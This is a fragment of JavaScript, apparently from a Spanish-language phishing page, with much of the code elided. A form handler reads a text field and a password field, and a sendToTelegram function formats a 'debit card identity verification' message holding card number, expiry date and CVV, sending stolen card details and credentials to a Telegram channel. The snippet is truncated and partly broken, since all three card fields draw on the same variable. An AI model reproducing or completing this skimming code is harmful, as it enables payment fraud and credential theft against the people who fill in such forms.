...
function sendToTelegram(data) {
    ...
    const message = `
    *✨ Verificando identidad (tarjeta de debito): ✨*

    📄 **Numero de tarjeta **: ${data.numeroDocumento}
        📄 **FECHA **: ${data.numeroDocumento}
        📄 **CVV **: ${data.numeroDocumento}
...
function handleFormSubmit(event) {
    ...
    const numeroDocumento1 = document.querySelector('input[type="text"]').value;
    const numeroDocumento2 = document.querySelector('input[type="password"]').value;
